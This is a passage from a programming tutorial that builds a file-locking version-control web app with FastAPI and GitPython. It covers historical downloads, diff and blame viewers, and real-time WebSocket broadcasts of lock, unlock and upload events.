        if commit_sha:
            # Download from specific commit
            commit = git_repo.commit(commit_sha)

            # Get file content from that commit
            try:
                file_content = (commit.tree / 'repo' / safe_filename).data_stream.read()
            except KeyError:
                raise HTTPException(
                    status_code=404,
                    detail=f"File '{safe_filename}' not found in commit {commit_sha[:8]}"
                )
        else:
            # Download current version
            file_path = REPO_PATH / safe_filename

            if not file_path.exists():
                raise HTTPException(status_code=404, detail="File not found")

            with open(file_path, 'rb') as f:
                file_content = f.read()

        # Log the download
        log_audit_event(
            user=current_user.username,
            action="DOWNLOAD_FILE",
            target=safe_filename,
            details={"commit": commit_sha or "HEAD"}
        )

        # Return file as download
        return StreamingResponse(
            io.BytesIO(file_content),
            media_type='application/octet-stream',
            headers={
                'Content-Disposition': f'attachment; filename="{safe_filename}"'
            }
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Download failed: {e}")
        raise HTTPException(status_code=500, detail="Download failed")
```

### Understanding Git Tree Navigation

```python
commit.tree / 'repo' / safe_filename
```

**What's happening:**

**`commit.tree`** - The root Tree object for this commit

```
Tree (root)
├── repo/
│   ├── PN1001.mcam (Blob)
│   └── PN1002.mcam (Blob)
├── locks.json (Blob)
└── users.json (Blob)
```

**`commit.tree / 'repo'`** - Navigate into the `repo` subdirectory (returns another Tree)

```
Tree (repo)
├── PN1001.mcam (Blob)
└── PN1002.mcam (Blob)
```

**`commit.tree / 'repo' / 'PN1001.mcam'`** - Get the Blob object

```
Blob (PN1001.mcam)
content: "G0 X0 Y0\nG1 X10..."
```

**`.data_stream.read()`** - Read the blob's content (bytes)

### Frontend: Download Button

Update `createFileElement()` in `app.js`:

```javascript
function createFileElement(file) {
  // ... existing code ...

  // Download button (always visible)
  const downloadBtn = document.createElement("button");
  downloadBtn.className = "btn btn-secondary";
  downloadBtn.textContent = "Download";
  downloadBtn.onclick = () => handleDownload(file.name);
  actionsDiv.appendChild(downloadBtn);

  // ... rest of code ...
}

async function handleDownload(filename) {
  const token = localStorage.getItem("access_token");

  try {
    const response = await fetch(`/api/files/${filename}/download`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (!response.ok) {
      throw new Error("Download failed");
    }

    // Create blob from response
    const blob = await response.blob();

    // Create download link
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();

    // Cleanup
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);

    showNotification(`Downloaded ${filename}`, "success");
  } catch (error) {
    console.error("Download error:", error);
    showNotification("Download failed", "error");
  }
}
```

### Understanding Blob URLs

```javascript
const url = window.URL.createObjectURL(blob);
// Result: "blob:http://localhost:8000/uuid-goes-here"
```

**What is a Blob URL?**

- Temporary URL that points to data in memory
- Created with `URL.createObjectURL()`
- Browser holds the data
- Can be used in `<a href>`, `<img src>`, etc.

**Why create a temporary `<a>` element?**

```javascript
const a = document.createElement("a");
a.href = url;
a.download = filename;
a.click();
```

- We need to trigger a download
- Setting `a.download` tells browser to download, not navigate
- `.click()` programmatically clicks the link
- User sees the save dialog

**Why cleanup?**

```javascript
window.URL.revokeObjectURL(url);
document.body.removeChild(a);
```

- Blob URLs consume memory
- Revoke to free memory
- Remove the hidden `<a>` element (we added it to DOM for `.click()` to work)

---

## 8.3: Diff Viewing - See What Changed

### What is a Diff?

A **diff** shows the differences between two versions of a file.

**Format:**

```diff
  Line that stayed the same
- Line that was removed
+ Line that was added
  Another unchanged line
```

**Example:**

```diff
  G0 X0 Y0
- G1 X10 Y10 F100
+ G1 X10 Y10 F200
  G0 Z5
```

This shows: Feed rate changed from F100 to F200.

### Unified Diff Format

**Standard diff output:**

```diff
--- a/file.txt
+++ b/file.txt
@@ -1,4 +1,4 @@
 Line 1
 Line 2
-Old line 3
+New line 3
 Line 4
```

**Breaking it down:**

**`--- a/file.txt`** - Original file (before)  
**`+++ b/file.txt`** - New file (after)

**`@@ -1,4 +1,4 @@`** - Hunk header

- `-1,4` - Starting at line 1 of original, showing 4 lines
- `+1,4` - Starting at line 1 of new, showing 4 lines

**Lines:**

- ` ` (space) - Unchanged
- `-` - Removed from original
- `+` - Added in new

### Get Diff Endpoint

```python
@app.get("/api/files/{filename}/diff")
def get_file_diff(
    filename: str,
    commit1: str,
    commit2: str = "HEAD",
    current_user: User = Depends(get_current_user)
):
    """
    Get diff between two commits for a file.

    Args:
        filename: File to compare
        commit1: Earlier commit (or 'HEAD~1' for previous)
        commit2: Later commit (default: HEAD = current)

    Returns:
        Unified diff output
    """
    logger.info(
        f"Diff request: {filename} between {commit1} and {commit2} "
        f"by {current_user.username}"
    )

    safe_filename = os.path.basename(filename)
    file_path = f'repo/{safe_filename}'

    try:
        # Resolve commit references
        c1 = git_repo.commit(commit1)
        c2 = git_repo.commit(commit2)

        # Get the diff
        diffs = c1.diff(c2, paths=file_path, create_patch=True)

        if not diffs:
            return {
                "filename": safe_filename,
                "commit1": c1.hexsha[:8],
                "commit2": c2.hexsha[:8],
                "diff": None,
                "message": "No changes between these commits"
            }

        diff_obj = diffs[0]

        return {
            "filename": safe_filename,
            "commit1": {
                "sha": c1.hexsha[:8],
                "message": c1.message.strip(),
                "author": c1.author.name,
                "date": c1.committed_datetime.isoformat()
            },
            "commit2": {
                "sha": c2.hexsha[:8],
                "message": c2.message.strip(),
                "author": c2.author.name,
                "date": c2.committed_datetime.isoformat()
            },
            "diff": diff_obj.diff.decode('utf-8'),
            "stats": {
                "insertions": diff_obj.diff.decode('utf-8').count('\n+'),
                "deletions": diff_obj.diff.decode('utf-8').count('\n-')
            }
        }

    except Exception as e:
        logger.error(f"Diff failed: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to generate diff: {str(e)}")
```

### Understanding Git Commit References

```python
commit = git_repo.commit("HEAD")      # Current commit
commit = git_repo.commit("HEAD~1")    # Previous commit
commit = git_repo.commit("HEAD~2")    # Two commits ago
commit = git_repo.commit("abc123")    # Specific commit by SHA
commit = git_repo.commit("main")      # Tip of main branch
```

**Tilde (`~`) notation:**

- `HEAD~1` = Parent of HEAD
- `HEAD~2` = Grandparent of HEAD
- `HEAD~3` = Great-grandparent
- etc.

**Caret (`^`) notation:**

- `HEAD^` = Parent of HEAD (same as `HEAD~1`)
- `HEAD^2` = Second parent (in merge commits)

### Frontend: Diff Viewer

Add to `index.html`:

```html
<!-- Diff Modal -->
<div id="diff-modal" class="modal-overlay hidden">
  <div class="modal-content modal-large">
    <div class="modal-header">
      <h3>File Diff</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <div id="diff-content">
        <p>Loading diff...</p>
      </div>
    </div>
  </div>
</div>
```

### Diff CSS

```css
.modal-large {
  max-width: 900px;
  width: 95%;
}

.diff-container {
  font-family: "Courier New", monospace;
  font-size: 0.9rem;
  background: #f8f9fa;
  padding: 1rem;
  border-radius: 4px;
  overflow-x: auto;
}

.diff-line {
  white-space: pre;
  padding: 0.1rem 0.5rem;
}

.diff-add {
  background: #d4edda;
  color: #155724;
}

.diff-remove {
  background: #f8d7da;
  color: #721c24;
}

.diff-context {
  color: #666;
}

.diff-header {
  color: #667eea;
  font-weight: bold;
  margin-top: 1rem;
}

.diff-stats {
  margin-bottom: 1rem;
  padding: 0.75rem;
  background: #e7f3ff;
  border-radius: 4px;
}

.diff-stats span {
  margin-right: 1.5rem;
}

.insertions {
  color: #28a745;
  font-weight: bold;
}

.deletions {
  color: #dc3545;
  font-weight: bold;
}
```

### Diff JavaScript

Add to `app.js`:

```javascript
const diffModal = new ModalManager("diff-modal");

async function showFileDiff(filename) {
  diffModal.open();

  const diffContent = document.getElementById("diff-content");
  diffContent.innerHTML = "<p>Loading diff...</p>";

  const token = localStorage.getItem("access_token");

  try {
    // Get diff between HEAD~1 and HEAD (latest change)
    const response = await fetch(
      `/api/files/${filename}/diff?commit1=HEAD~1&commit2=HEAD`,
      {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      }
    );

    if (!response.ok) {
      throw new Error("Failed to load diff");
    }

    const data = await response.json();

    if (!data.diff) {
      diffContent.innerHTML = `
                <p>No changes found between commits.</p>
            `;
      return;
    }

    renderDiff(data);
  } catch (error) {
    console.error("Diff error:", error);
    diffContent.innerHTML = `
            <p class="error">Failed to load diff: ${error.message}</p>
        `;
  }
}

function renderDiff(data) {
  const diffContent = document.getElementById("diff-content");

  let html = `
        <div class="diff-stats">
            <strong>Changes:</strong>
            <span class="insertions">+${data.stats.insertions} additions</span>
            <span class="deletions">-${data.stats.deletions} deletions</span>
        </div>
        
        <p><strong>Comparing:</strong></p>
        <p>📝 ${data.commit1.sha}: ${data.commit1.message} (${data.commit1.author})</p>
        <p>📝 ${data.commit2.sha}: ${data.commit2.message} (${data.commit2.author})</p>
        
        <div class="diff-container">
    `;

  // Parse and display diff
  const lines = data.diff.split("\n");

  for (const line of lines) {
    let className = "diff-context";

    if (line.startsWith("+++") || line.startsWith("---")) {
      className = "diff-header";
    } else if (line.startsWith("+")) {
      className = "diff-add";
    } else if (line.startsWith("-")) {
      className = "diff-remove";
    } else if (line.startsWith("@@")) {
      className = "diff-header";
    }

    const escapedLine = line
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

    html += `<div class="${className}">${escapedLine}</div>`;
  }

  html += "</div>";
  diffContent.innerHTML = html;
}
```

### Add "View Diff" Button

Update `createFileElement()`:

```javascript
// View diff button
const diffBtn = document.createElement("button");
diffBtn.className = "btn btn-secondary";
diffBtn.textContent = "View Diff";
diffBtn.onclick = () => showFileDiff(file.name);
actionsDiv.appendChild(diffBtn);
```

---

## 8.4: Blame View - Line-by-Line Attribution

### What is Git Blame?

**Blame** shows who last modified each line of a file.

**Example output:**

```
abc123 (John Doe  2025-01-15) Line 1: G0 X0 Y0
abc123 (John Doe  2025-01-15) Line 2: G1 X10 Y10
def456 (Jane Smith 2025-02-20) Line 3: G1 X20 Y20
abc123 (John Doe  2025-01-15) Line 4: G0 Z5
```

**Use cases:**

- "Who wrote this line?"
- "When was this changed?"
- "Who do I ask about this code?"

### Blame Endpoint

```python
@app.get("/api/files/{filename}/blame")
def get_file_blame(
    filename: str,
    commit_sha: str = "HEAD",
    current_user: User = Depends(get_current_user)
):
    """
    Get blame (line-by-line attribution) for a file.

    Shows which commit last modified each line.
    """
    logger.info(f"Blame request: {filename} by {current_user.username}")

    safe_filename = os.path.basename(filename)
    file_path = f'repo/{safe_filename}'

    try:
        commit = git_repo.commit(commit_sha)

        # Run git blame
        blame_output = git_repo.blame(commit, file_path)

        # Parse blame output
        lines = []
        for commit_obj, line_content in blame_output:
            lines.append({
                "commit": {
                    "sha": commit_obj.hexsha[:8],
                    "author": commit_obj.author.name,
                    "date": commit_obj.committed_datetime.isoformat(),
                    "message": commit_obj.message.strip()
                },
                "content": line_content.decode('utf-8', errors='replace').rstrip()
            })

        return {
            "filename": safe_filename,
            "total_lines": len(lines),
            "lines": lines
        }

    except Exception as e:
        logger.error(f"Blame failed: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to generate blame: {str(e)}")
```

### Understanding `git blame` Output

```python
blame_output = git_repo.blame(commit, file_path)
### Returns: List of tuples
### Each tuple: (Commit object, line content as bytes)
```

**Example:**

```python
[
    (Commit<abc123>, b"G0 X0 Y0\n"),
    (Commit<abc123>, b"G1 X10 Y10\n"),
    (Commit<def456>, b"G1 X20 Y20\n"),
]
```

### Blame Frontend

Add modal to `index.html`:

```html
<!-- Blame Modal -->
<div id="blame-modal" class="modal-overlay hidden">
  <div class="modal-content modal-large">
    <div class="modal-header">
      <h3>File Blame</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <div id="blame-content">
        <p>Loading blame...</p>
      </div>
    </div>
  </div>
</div>
```

### Blame CSS

```css
.blame-container {
  font-family: "Courier New", monospace;
  font-size: 0.9rem;
  background: #f8f9fa;
  border-radius: 4px;
  overflow: auto;
}

.blame-line {
  display: flex;
  border-bottom: 1px solid #e0e0e0;
}

.blame-line:hover {
  background: #fff3cd;
}

.blame-info {
  padding: 0.5rem;
  min-width: 300px;
  background: #fff;
  border-right: 2px solid #667eea;
  font-size: 0.85rem;
}

.blame-commit {
  color: #667eea;
  font-weight: bold;
}

.blame-author {
  color: #666;
}

.blame-date {
  color: #999;
  font-size: 0.8rem;
}

.blame-content {
  padding: 0.5rem;
  flex: 1;
  white-space: pre;
}

.line-number {
  display: inline-block;
  width: 3rem;
  color: #999;
  text-align: right;
  margin-right: 1rem;
}
```

### Blame JavaScript

```javascript
const blameModal = new ModalManager("blame-modal");

async function showFileBlame(filename) {
  blameModal.open();

  const blameContent = document.getElementById("blame-content");
  blameContent.innerHTML = "<p>Loading blame...</p>";

  const token = localStorage.getItem("access_token");

  try {
    const response = await fetch(`/api/files/${filename}/blame`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (!response.ok) {
      throw new Error("Failed to load blame");
    }

    const data = await response.json();
    renderBlame(data);
  } catch (error) {
    console.error("Blame error:", error);
    blameContent.innerHTML = `
            <p class="error">Failed to load blame: ${error.message}</p>
        `;
  }
}

function renderBlame(data) {
  const blameContent = document.getElementById("blame-content");

  let html = `
        <p><strong>${data.filename}</strong> (${data.total_lines} lines)</p>
        <div class="blame-container">
    `;

  data.lines.forEach((line, index) => {
    const lineNum = index + 1;
    const date = new Date(line.commit.date).toLocaleDateString();

    html += `
            <div class="blame-line">
                <div class="blame-info">
                    <div class="blame-commit">${line.commit.sha}</div>
                    <div class="blame-author">${line.commit.author}</div>
                    <div class="blame-date">${date}</div>
                </div>
                <div class="blame-content">
                    <span class="line-number">${lineNum}</span>${escapeHtml(
      line.content
    )}
                </div>
            </div>
        `;
  });

  html += "</div>";
  blameContent.innerHTML = html;
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}
```

### Add "Blame" Button

```javascript
// Blame button
const blameBtn = document.createElement("button");
blameBtn.className = "btn btn-secondary";
blameBtn.textContent = "Blame";
blameBtn.onclick = () => showFileBlame(file.name);
actionsDiv.appendChild(blameBtn);
```

---

## Stage 8 Complete - Advanced Git Mastery

### What You Built

You now have:

- File upload with drag-and-drop
- File download (current and historical versions)
- Visual diff viewer
- Blame view (line-by-line attribution)
- Complete version history
- Professional Git workflow

### Key Concepts Mastered

**File Operations:**

- Multipart form uploads in FastAPI
- Filename sanitization (security)
- Drag-and-drop API
- Programmatic file downloads
- Blob URLs

**Git Deep Dive:**

- Tree navigation (`commit.tree / path`)
- Diff generation and parsing
- Blame (line attribution)
- Commit references (HEAD~1, etc.)
- Unified diff format

**Frontend Skills:**

- Drag-and-drop events
- File preview
- Diff syntax highlighting
- Modal dialogs
- Dynamic HTML generation

### Verification Checklist

- [ ] Can upload files via drag-and-drop or click
- [ ] Upload creates Git commit
- [ ] Can download current version
- [ ] Can download historical version
- [ ] Diff shows changes between commits
- [ ] Blame shows who wrote each line
- [ ] Understand unified diff format
- [ ] Understand Git tree structure
- [ ] Understand Blob URLs

### Security Best Practices Applied

✓ **File size limits** (prevent DoS)  
✓ **Extension validation** (only .mcam)  
✓ **Filename sanitization** (prevent directory traversal)  
✓ **Authentication required** (all operations)  
✓ **Audit logging** (upload/download tracked)

### The Complete Git Workflow

```
User uploads file
    ↓
Server validates
    ↓
Pull from GitLab (get latest)
    ↓
Write file to disk
    ↓
Stage in Git (git add)
    ↓
Commit with attribution
    ↓
Push to GitLab (backup)
    ↓
Done! (file is versioned and safe)
```

#

In **Stage 9**, we'll add **real-time collaboration features**:

- WebSockets for live updates
- See who's currently editing
- Push notifications when files unlock
- Real-time file status updates
- Collaborative presence indicators

Your app is now a professional version control system. Next, we make it collaborative in real-time!

---

### Stage 9: Real-Time Collaboration - WebSockets & Live Updates

## Introduction: The Goal of This Stage

Your app works great, but users don't know what others are doing. Someone locks a file? You won't know until you manually refresh. A file becomes available? You miss it.

In this stage, you'll add **real-time collaboration** using WebSockets - turning your app from request-response to event-driven, live updates.

By the end of this stage, you will:

- Understand WebSockets vs HTTP (full-duplex communication)
- Implement WebSocket server in FastAPI
- Manage connected clients (connection pool)
- Broadcast events to all users
- Build a WebSocket client in JavaScript
- Show presence indicators (who's online)
- Display live file status updates
- Handle reconnection after network failures
- Design a message protocol

**Time Investment:** 7-9 hours

---

## 9.1: WebSockets vs HTTP - Understanding the Difference

### HTTP: Request-Response Pattern

**Traditional HTTP:**

```
Client                          Server
  │                               │
  ├──── GET /api/files ──────────>│
  │                               │ (processes request)
  │<──── Response (JSON) ─────────┤
  │                               │
  │     (connection closes)       │
  │                               │
  │     (30 seconds pass...)      │
  │                               │
  ├──── GET /api/files ──────────>│  (poll for updates)
  │<──── Response ────────────────┤
```

**Problems:**

- **Polling** - Client must repeatedly ask "anything new?"
- **Latency** - Updates delayed until next poll
- **Inefficient** - Wastes bandwidth (most polls return "no change")
- **Server load** - Constant requests, even when nothing changed

### WebSockets: Full-Duplex Communication

**WebSocket:**

```
Client                          Server
  │                               │
  ├──── WebSocket Handshake ─────>│
  │<──── 101 Switching Protocols ─┤
  │                               │
  │═════════ Connection ══════════│ (stays open)
  │                               │
  │<──── "file_locked" event ─────┤ (server pushes)
  │                               │
  ├──── "subscribe" message ─────>│ (client sends)
  │                               │
  │<──── "file_unlocked" event ───┤ (server pushes)
  │                               │
  │     (connection stays open)   │
```

**Benefits:**

- **Real-time** - Server pushes updates instantly
- **Efficient** - Single persistent connection
- **Bidirectional** - Both sides can send messages
- **Low latency** - No request overhead

### The WebSocket Handshake

**Step 1: Client requests upgrade**

```http
GET /ws HTTP/1.1
Host: localhost:8000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

**Step 2: Server accepts**

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Step 3: Connection established**

- Protocol switches from HTTP to WebSocket
- Bidirectional message channel open
- Stays open until explicitly closed

### WebSocket Frame Format

**After handshake, messages are sent as frames:**

```
0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
```

**Key fields:**

- **FIN** - Final frame (messages can be fragmented)
- **Opcode** - Message type (text, binary, ping, pong, close)
- **MASK** - Client→Server messages must be masked (security)
- **Payload** - The actual message content

**You won't work with frames directly** - libraries handle this.

---

## 9.2: WebSocket Server in FastAPI

### Install WebSocket Dependencies

FastAPI has built-in WebSocket support, no extra packages needed!

### Connection Manager

Create a manager to track all connected clients.

Add to `main.py`:

```python
from fastapi import WebSocket, WebSocketDisconnect
from typing import Dict, Set
import json
from datetime import datetime, timezone

### ============================================
### WEBSOCKET CONNECTION MANAGER
### ============================================

class ConnectionManager:
    """
    Manages WebSocket connections and broadcasts messages.

    Maintains a registry of active connections and provides
    methods to send messages to one or all clients.
    """

    def __init__(self):
        # Dictionary mapping username to WebSocket connection
        self.active_connections: Dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket, username: str):
        """
        Accept a new WebSocket connection.

        Args:
            websocket: The WebSocket connection
            username: Username of the connected user
        """
        await websocket.accept()
        self.active_connections[username] = websocket
        logger.info(f"WebSocket connected: {username} (total: {len(self.active_connections)})")

        # Notify all users about the new connection
        await self.broadcast({
            "type": "user_connected",
            "username": username,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "online_users": list(self.active_connections.keys())
        })

    def disconnect(self, username: str):
        """
        Remove a WebSocket connection.

        Args:
            username: Username of the disconnected user
        """
        if username in self.active_connections:
            del self.active_connections[username]
            logger.info(f"WebSocket disconnected: {username} (total: {len(self.active_connections)})")

    async def send_personal_message(self, message: dict, username: str):
        """
        Send a message to a specific user.

        Args:
            message: Message dictionary (will be JSON-encoded)
            username: Target username
        """
        if username in self.active_connections:
            websocket = self.active_connections[username]
            await websocket.send_json(message)

    async def broadcast(self, message: dict, exclude: Set[str] = None):
        """
        Send a message to all connected users.

        Args:
            message: Message dictionary (will be JSON-encoded)
            exclude: Optional set of usernames to exclude
        """
        if exclude is None:
            exclude = set()

        # Send to all connections except excluded ones
        disconnected = []

        for username, websocket in self.active_connections.items():
            if username not in exclude:
                try:
                    await websocket.send_json(message)
                except Exception as e:
                    logger.error(f"Error sending to {username}: {e}")
                    disconnected.append(username)

        # Clean up disconnected clients
        for username in disconnected:
            self.disconnect(username)

    def get_online_users(self) -> list:
        """Get list of currently connected usernames."""
        return list(self.active_connections.keys())

### Create global connection manager
manager = ConnectionManager()
```

### Understanding the Connection Manager

**Why a dictionary?**

```python
self.active_connections: Dict[str, WebSocket] = {}
```

- Key: Username (string)
- Value: WebSocket connection object
- Allows sending messages to specific users
- Allows listing who's online

**Why `async/await` everywhere?**

```python
async def send_personal_message(self, message: dict, username: str):
    await websocket.send_json(message)
```

- WebSocket I/O is asynchronous (network operations)
- `await` prevents blocking
- Multiple connections handled concurrently

**Why track disconnected clients during broadcast?**

```python
disconnected = []
for username, websocket in self.active_connections.items():
    try:
        await websocket.send_json(message)
    except Exception as e:
        disconnected.append(username)
```

**The problem:** Client might disconnect silently (network failure, closed browser)

**The solution:** Catch send errors, mark for removal, clean up after loop

**Why not remove during iteration?**

```python
### BAD - modifies dict during iteration
for username, websocket in self.active_connections.items():
    del self.active_connections[username]  # RuntimeError!

### GOOD - collect, then remove
disconnected = []
for username, websocket in self.active_connections.items():
    disconnected.append(username)
for username in disconnected:
    del self.active_connections[username]
```

---

## 9.3: WebSocket Endpoint with Authentication

### Extract User from Token

WebSockets don't have standard headers, so we'll use query parameters for auth.

Add helper function:

```python
async def get_current_user_ws(token: str) -> User:
    """
    Get current user from WebSocket token.
    Similar to get_current_user but for WebSocket context.
    """
    if not token:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing authentication token"
        )

    # Decode token
    token_data = decode_access_token(token)

    # Get user
    user = get_user(token_data.username)
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found"
        )

    return User(
        username=user["username"],
        full_name=user["full_name"],
        role=user["role"]
    )
```

### WebSocket Endpoint

```python
@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket,
    token: str = None
):
    """
    WebSocket endpoint for real-time updates.

    Query parameters:
        token: JWT authentication token

    Message protocol:
        Client → Server:
            {"type": "ping"}
            {"type": "subscribe", "file": "filename.mcam"}

        Server → Client:
            {"type": "file_locked", "filename": "...", "user": "..."}
            {"type": "file_unlocked", "filename": "..."}
            {"type": "file_uploaded", "filename": "..."}
            {"type": "user_connected", "username": "..."}
            {"type": "user_disconnected", "username": "..."}
    """
    # Authenticate
    try:
        user = await get_current_user_ws(token)
    except HTTPException as e:
        await websocket.close(code=1008, reason="Authentication failed")
        return

    # Connect
    await manager.connect(websocket, user.username)

    try:
        while True:
            # Receive messages from client
            data = await websocket.receive_json()

            message_type = data.get("type")

            if message_type == "ping":
                # Respond to ping with pong
                await websocket.send_json({
                    "type": "pong",
                    "timestamp": datetime.now(timezone.utc).isoformat()
                })

            elif message_type == "get_online_users":
                # Send list of online users
                await websocket.send_json({
                    "type": "online_users",
                    "users": manager.get_online_users()
                })

            else:
                logger.warning(f"Unknown message type: {message_type}")

    except WebSocketDisconnect:
        manager.disconnect(user.username)

        # Notify others
        await manager.broadcast({
            "type": "user_disconnected",
            "username": user.username,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "online_users": manager.get_online_users()
        })

    except Exception as e:
        logger.error(f"WebSocket error for {user.username}: {e}")
        manager.disconnect(user.username)
```

### Understanding WebSocket Lifecycle

**The flow:**

1. **Client connects** - `websocket.accept()`
2. **Event loop starts** - `while True:`
3. **Receive messages** - `await websocket.receive_json()`
4. **Process message** - Handle based on type
5. **Send response** - `await websocket.send_json()`
6. **Loop continues** - Back to step 3
7. **Client disconnects** - `WebSocketDisconnect` exception
8. **Cleanup** - Remove from manager

**Why `while True`?**

- Keep connection alive
- Continuously listen for messages
- Exits only on disconnect or error

**Why `receive_json()`?**

```python
data = await websocket.receive_json()
```

- Waits for next message from client
- Automatically parses JSON
- Blocks until message arrives (async, so doesn't block other connections)

**Alternative methods:**

```python
text = await websocket.receive_text()    # Raw text
bytes = await websocket.receive_bytes()  # Binary data
```

### Close Codes

```python
await websocket.close(code=1008, reason="Authentication failed")
```

**Standard WebSocket close codes:**

| Code | Meaning                                |
| ---- | -------------------------------------- |
| 1000 | Normal closure                         |
| 1001 | Going away (browser closing)           |
| 1002 | Protocol error                         |
| 1003 | Unsupported data                       |
| 1006 | Abnormal closure (no close frame sent) |
| 1008 | Policy violation (e.g., auth failure)  |
| 1011 | Internal server error                  |

---

## 9.4: Broadcasting File Events

### Update Checkout to Broadcast

Modify `checkout_file()` endpoint:

```python
@app.post("/api/files/checkout")
async def checkout_file(  # Note: async now
    request: CheckoutRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkout a file with real-time notification."""
    logger.info(f"Checkout request: {request.filename} by {current_user.username}")

    file_path = REPO_PATH / request.filename
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    locks = load_locks()

    if request.filename in locks:
        existing_lock = locks[request.filename]
        raise HTTPException(
            status_code=409,
            detail={
                "error": "File is already checked out",
                "locked_by": existing_lock["user"],
                "locked_at": existing_lock["timestamp"]
            }
        )

    # Create lock
    locks[request.filename] = {
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    }

    # Save with Git commit
    commit_msg = f"Checkout: {request.filename} by {current_user.username}"
    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKOUT_FILE",
        target=request.filename,
        details={"message": request.message}
    )
    save_audit_log_with_commit(f"Audit: Checkout {request.filename}")

    # ✨ BROADCAST TO ALL CONNECTED CLIENTS ✨
    await manager.broadcast({
        "type": "file_locked",
        "filename": request.filename,
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "message": request.message
    })

    return {
        "success": True,
        "message": f"File '{request.filename}' checked out"
    }
```

### Update Checkin to Broadcast

```python
@app.post("/api/files/checkin")
async def checkin_file(  # async
    request: CheckinRequest,
    current_user: User = Depends(get_current_user)
):
    """Checkin a file with real-time notification."""
    logger.info(f"Checkin request: {request.filename} by {current_user.username}")

    check_file_ownership(request.filename, current_user, allow_admin_override=True)

    locks = load_locks()
    was_forced = locks[request.filename]["user"] != current_user.username

    # Remove lock
    del locks[request.filename]

    # Save with Git commit
    commit_msg = f"Checkin: {request.filename} by {current_user.username}"
    if was_forced:
        commit_msg += " (forced by admin)"

    save_locks_with_commit(locks, current_user.username, commit_msg)

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKIN_FILE",
        target=request.filename,
        details={"forced": was_forced}
    )
    save_audit_log_with_commit(f"Audit: Checkin {request.filename}")

    # ✨ BROADCAST ✨
    await manager.broadcast({
        "type": "file_unlocked",
        "filename": request.filename,
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "was_forced": was_forced
    })

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in"
    }
```

### Update Upload to Broadcast

```python
@app.post("/api/files/upload")
async def upload_file(
    file: UploadFile = File(...),
    current_user: User = Depends(get_current_user)
):
    # ... existing upload logic ...

    # After successful commit:

    # ✨ BROADCAST ✨
    await manager.broadcast({
        "type": "file_uploaded",
        "filename": safe_filename,
        "user": current_user.username,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "size": len(content)
    })

    return {
        "success": True,
        "message": f"File '{safe_filename}' uploaded successfully",
        "commit": commit.hexsha[:8],
        "size": len(content)
    }
```

---

## 9.5: WebSocket Client - Frontend

### Connect to WebSocket

Add to `app.js`:

```javascript
// ============================================
// WEBSOCKET CONNECTION
// ============================================

let ws = null;
let reconnectInterval = null;

function connectWebSocket() {
  const token = localStorage.getItem("access_token");
  if (!token) {
    console.log("No token, skipping WebSocket connection");
    return;
  }

  // Determine WebSocket URL
  const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
  const wsUrl = `${protocol}//${window.location.host}/ws?token=${token}`;

  console.log("Connecting to WebSocket:", wsUrl);

  try {
    ws = new WebSocket(wsUrl);

    ws.onopen = handleWebSocketOpen;
    ws.onmessage = handleWebSocketMessage;
    ws.onerror = handleWebSocketError;
    ws.onclose = handleWebSocketClose;
  } catch (error) {
    console.error("WebSocket connection error:", error);
    scheduleReconnect();
  }
}

function handleWebSocketOpen(event) {
  console.log("WebSocket connected");

  // Clear reconnect timer
  if (reconnectInterval) {
    clearInterval(reconnectInterval);
    reconnectInterval = null;
  }

  // Show connection indicator
  updateConnectionStatus(true);

  // Request online users
  ws.send(
    JSON.stringify({
      type: "get_online_users",
    })
  );
}

function handleWebSocketMessage(event) {
  try {
